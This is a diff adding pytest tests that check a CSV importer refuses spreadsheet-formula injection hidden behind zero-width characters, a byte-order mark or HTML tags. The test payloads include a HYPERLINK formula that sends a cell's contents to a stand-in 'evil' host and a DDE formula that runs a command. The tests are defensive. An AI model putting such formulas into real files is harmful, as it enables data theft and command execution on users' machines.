@@ -242,3 +242,47 @@ class TestUnknownColumnsAreRefused:
             writer.writerow({**_row(), "cre_id_2": "111-111"})
         with pytest.raises(ValueError, match="cre_id_2"):
             _import(path, tmp_path / "o.jsonl")
+
+
+class TestTheFormulaGuardCannotBeBypassed:
+    """The guard tested the RAW text, then stored the SANITISED text.
+
+    sanitize_text strips zero-width characters and HTML, so a payload prefixed
+    with either failed the raw prefix check and was stored with a leading "=".
+    Whatever is stored is what a reviewer's spreadsheet opens, so that is what
+    has to be tested. Every one of these was accepted before the fix.
+    """
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "​=HYPERLINK(\"http://evil/?x=\"&A1,\"click\")",
+            "<b></b>=cmd|\"/c calc\"!A1",
+            "﻿@SUM(1)",
+            "‍+1+1",
+            "‌-1",
+        ],
+    )
+    def test_a_prefixed_payload_is_refused(
+        self, tmp_path: Path, payload: str
+    ) -> None:
+        with pytest.raises(ValueError, match="formula"):
+            _import(
+                _sheet(tmp_path, [_row(rationale=payload)]), tmp_path / "o.jsonl"
+            )
+
+    def test_nothing_reaches_disk_with_a_formula_prefix(
+        self, tmp_path: Path
+    ) -> None:
+        """The property, stated over the artifact rather than the input."""
+        out = tmp_path / "o.jsonl"
+        _import(
+            _sheet(
+                tmp_path,
+                [_row(rationale="maps here; see AC-3 = access enforcement")],
+            ),
+            out,
+        )
+        for line in out.read_text(encoding="utf-8").splitlines():
+            stored = json.loads(line)["rationale"]
+            assert stored[:1] not in ("=", "+", "-", "@")
